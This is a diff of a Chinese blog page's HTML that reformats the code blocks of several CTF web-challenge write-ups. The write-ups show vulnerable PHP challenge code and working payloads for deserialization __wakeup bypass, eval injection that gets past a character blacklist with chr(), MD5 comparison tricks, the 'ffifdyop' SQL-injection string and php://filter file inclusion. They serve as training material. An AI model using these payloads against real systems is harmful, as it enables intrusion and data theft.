 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>index.php</strong></p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-   <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;
-   <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];
-   <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);
-   <span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+   include &#39;class.php&#39;;
+   $select &#x3D; $_GET[&#39;select&#39;];
+   $res&#x3D;unserialize(@$select);
+   ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">通过class.php里的__construct，__wakeup,__destruct函数可以判断index.php中的反序列化存在漏洞。先通过class.php的内容构建一个反序列化,构造后的结果如下图。</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041750938.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
-<pre class="line-numbers language-highlight php">修改前 O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;s:<span class="number">3</span>:<span class="string"><code class="language-highlight php">修改前 O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;Nameusername&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;Namepassword&quot;</span>;s:<span class="number">3</span>:<span class="string">"100"</span>;}
-修改后 O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:{s:<span class="number">14</span>:<span class="string">"Nameusername"</span>;s:<span class="number">5</span>:<span class="string">"admin"</span>;s:<span class="number">14</span>:<span class="string">"Namepassword"</span>;s:<span class="number">3</span>:<span class="string">"100"</span>;}
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">修改前 O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;
+修改后 O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;&#125;
 
 修改前
-O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22100</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D
+O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
 修改后
-O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Name%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>Name%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22100</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在class.php里，要满足username&#x3D;admin 和 password&#x3D;100从而满足得到flag的条件，而在index.php里，我们知道get传参传的是 <strong>select 。</strong>但<strong>select</strong>要被反序列化才行。而为什么还需要使用<strong>urlencode</strong>对序列化后的**$b<strong>进行，</strong>是因为private序列化后的特使字符如果不使用字符表示会无法显示出来。而当当反序列化字符串，Object的值大于真实属性个数时，会跳过 __wakeup 函数的执行。即第一个”Name”后的数字。**</p>
 <p>最后再使用select传参得到flag</p>
@@ -730,23 +727,23 @@ O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="nu
 <p><strong>绕过______wakeup() 当反序列化字符串，Object的值大于真实属性个数时，会跳过 __wakeup 函数的执行。即第一个”Name”后的数字</strong>。</p>
 <h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><h3 id="一、本题做题思路-12"><a href="#一、本题做题思路-12" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>这题光靠打开页面什么也得不到，只能通过题目得到提示，然后对网站后缀进行搜索找到备份网站。</p>
 <p>通过dirsearch找到备份网站为<strong>url+&#x2F;index.php,bak。</strong>得到一个文件，打开后发现是代码审计</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="keyword">include_once</span> <span class="string">"flag.php"</span>;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+include_once &quot;flag.php&quot;;
 
-<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) {
-    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];<span class="comment">//$key=key</span>
-    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) {
-        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);<span class="comment">//判断$key是不是数字。</span>
-    }
-    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);
-    <span class="variable">$str</span> = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;
-    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) {
-        <span class="keyword">echo</span> <span class="variable">$flag</span>;  <span class="variable">$key</span>弱等于字符串<span class="variable">$str</span>
-    }
-}
-<span class="keyword">else</span> {
-    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if(isset($_GET[&#39;key&#39;])) &#123;
+    $key &#x3D; $_GET[&#39;key&#39;];&#x2F;&#x2F;$key&#x3D;key
+    if(!is_numeric($key)) &#123;
+        exit(&quot;Just num!&quot;);&#x2F;&#x2F;判断$key是不是数字。
+    &#125;
+    $key &#x3D; intval($key);
+    $str &#x3D; &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;
+    if($key &#x3D;&#x3D; $str) &#123;
+        echo $flag;  $key弱等于字符串$str
+    &#125;
+&#125;
+else &#123;
+    echo &quot;Try to find out source file!&quot;;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
 <blockquote>
@@ -759,21 +756,21 @@ O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="nu
 <h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><h3 id="一、本题做题思路-13"><a href="#一、本题做题思路-13" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>光看页面就是简单的计算器</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041754486.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">所以从源代码里面找找线索，找到了一个calc.php。和题主用waf来确保安全，访问calc.php</p>
 <p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041755628.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041755604.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">源代码如下:</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
-<span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])){
-    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);
-}<span class="keyword">else</span>{
-        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];  <span class="comment">//get传参</span>
-        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;"&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];
-        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) {
-                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) {
-                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);
-                }
-        }
-        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);
-}
-<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+error_reporting(0);
+if(!isset($_GET[&#39;num&#39;]))&#123;
+    show_source(__FILE__);
+&#125;else&#123;
+        $str &#x3D; $_GET[&#39;num&#39;];  &#x2F;&#x2F;get传参
+        $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
+        foreach ($blacklist as $blackitem) &#123;
+                if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $str)) &#123;
+                        die(&quot;what are you want to do?&quot;);
+                &#125;
+        &#125;
+        eval(&#39;echo &#39;.$str.&#39;;&#39;);
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>preg_match 函数用于执行一个正则表达式匹配。</strong> </p>
 <p>再结合上面所给的提示，所以我们需要用php的字符串解析特性从而达到绕过waf的效果，可以在num前加一个空格(或者加一个+)。</p>
@@ -790,7 +787,7 @@ O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="nu
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041756840.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在第八个找到我们的目标，因为它把’ ‘过滤了，所以我们只能chr()一个字符一个字符的绕过</p>
 <blockquote>
 <p>构造为 </p>
-<pre class="line-numbers language-highlight php">url+/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">49</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>).<span class="title function_ invoke__">chr</span>(<span class="number"><code class="language-highlight php">url+/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">49</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">url+&#x2F;calc.php? num&#x3D;print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
 <p>类似于 url+&#x2F;?calc.php? num&#x3D;print_r(file_get_contents(‘&#x2F;f1agg’));</p>
@@ -806,17 +803,17 @@ O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="nu
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041757291.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现一个独特的php，访问一下看看能得到什么 </p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041757297.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">flag需要money&#x3D;100000000，然后必须是来自CUIT的学生。 </p>
 <p>其界面写出了要得到flag的限制条件，在源代码里面则是有着一串代码</p>
-<pre class="line-numbers language-highlight php"><code class="language-highlight php"><!--
-	~~~post money <span class="keyword">and</span> password~~~
-<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) {
-	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];
-	<span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) {
-		<span class="keyword">echo</span> <span class="string">"password can&#x27;t be number</br>"</span>;<span class="comment">//判断password是不是数字。</span>
-	}<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) {
-		<span class="keyword">echo</span> <span class="string">"Password Right!</br>"</span>;
-	}
-}
---><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;!--
+	~~~post money and password~~~
+if (isset($_POST[&#39;password&#39;])) &#123;
+	$password &#x3D; $_POST[&#39;password&#39;];
+	if (is_numeric($password)) &#123;
+		echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;&#x2F;&#x2F;判断password是不是数字。
+	&#125;elseif ($password &#x3D;&#x3D; 404) &#123;
+		echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;
+	&#125;
+&#125;
+--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看到cookie等于0,考虑到计算机的世界只有俩个数字(滑稽)。尝试改成1后再传password的参试试。 </p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758517.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758605.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">修改后需要我们满足另一个条件了足够的钱，根据上面代码所表示，钱是$money。发现如果直接传money&#x3D;100000000会出现如下图的结果。</p>
@@ -829,13 +826,13 @@ O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="nu
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041759496.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在抓包的时候找到了提示<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041759493.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">即构造$pass经md5加密后出现**<code>or</code>** ，可令该SQL语句返回**<code>true</code><strong>。不过还是不会，看大佬WP是用</strong><code>ffifdyop</code><strong>绕过，因为这个字符被MD5哈希了之后前几位刚好是</strong><code>&#39; or &#39;6</code>** 所以这里就绕过去了。</p>
 <p>跳转到一个新的网站，从源代码里可以找到本题解题关键</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041800595.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
-<pre class="line-numbers language-highlight php"><code class="language-highlight php"><!--
-<span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];
-<span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;!--
+$a &#x3D; $GET[&#39;a&#39;];
+$b &#x3D; $_GET[&#39;b&#39;];
 
-<span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> && <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)){
-    <span class="comment">// wow, glzjin wants a girl friend.</span>
---><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;
+    &#x2F;&#x2F; wow, glzjin wants a girl friend.
+--&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">$a不等于$b，但是md5($a)等于md5($b),平常经常遇到的md5弱等于绕过。</p>
 <blockquote>
@@ -843,15 +840,15 @@ O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="nu
 </blockquote>
 <p>又进入一个新的网页</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041800536.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
-<pre class="line-numbers language-highlight php"> <span class="meta"><code class="language-highlight php"> <span class="meta"><?php</span>
-<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
-<span class="keyword">include</span> <span class="string">"flag.php"</span>;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"> &lt;?php
+error_reporting(0);
+include &quot;flag.php&quot;;
 
-<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
+highlight_file(__FILE__);
 
-<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&&<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>])){
-    <span class="keyword">echo</span> <span class="variable">$flag</span>;
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;
+    echo $flag;
+&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">这又考我们md5强等于绕过，可以通过数组绕过来得到flag</p>
 <blockquote>
@@ -925,25 +922,25 @@ O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="nu
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805562.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">成功进入，通过主目录内找到flag</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805573.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805588.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
 <h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="一、本题做题思路-18"><a href="#一、本题做题思路-18" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041806984.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">打开后就是一串php代码。</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>  
-<span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">"text"</span>];
-<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];
-<span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">"password"</span>];
-<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&&(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">"welcome to the zjctf"</span>)){<span class="comment">//要求我们传入一个text文件，内容为welcome to the zjctf</span>
-    <span class="keyword">echo</span> <span class="string">"<br><h1>"</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">"</h1></br>"</span>;
-    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag/"</span>,<span class="variable">$file</span>)){<span class="comment">//正则运算将flag过滤</span>
-        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;
-        <span class="keyword">exit</span>(); 
-    }<span class="keyword">else</span>{
-        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php//提示一个php</span>
-        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);
-        <span class="keyword">echo</span> <span class="variable">$password</span>;
-    }
-}
-<span class="keyword">else</span>{
-    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
-}
-<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php  
+$text &#x3D; $_GET[&quot;text&quot;];
+$file &#x3D; $_GET[&quot;file&quot;];
+$password &#x3D; $_GET[&quot;password&quot;];
+if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;&#x2F;&#x2F;要求我们传入一个text文件，内容为welcome to the zjctf
+    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;
+    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;&#x2F;&#x2F;正则运算将flag过滤
+        echo &quot;Not now!&quot;;
+        exit(); 
+    &#125;else&#123;
+        include($file);  &#x2F;&#x2F;useless.php&#x2F;&#x2F;提示一个php
+        $password &#x3D; unserialize($password);
+        echo $password;
+    &#125;
+&#125;
+else&#123;
+    highlight_file(__FILE__);
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">**file_get_contents()**函数在我们上面一道题中使用过，是用来读取文件。’r’是读取方式</p>
 <p>通过<strong>php:&#x2F;&#x2F;input</strong>绕过该函数 </p>
@@ -954,19 +951,19 @@ O%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="nu
 <p>所以构造payload url+&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
 </blockquote>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807697.png">得到一串base64代码，解密后得到</p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>  
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php  
  
-<span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>{  <span class="comment">//flag.php  </span>
-    <span class="keyword">public</span> <span class="variable">$file</span>;  
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>{  
-        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>->file)){  
-            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>->file); 
-            <span class="keyword">echo</span> <span class="string">"<br>"</span>;
-        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);
-        }  
-    }  
-}  
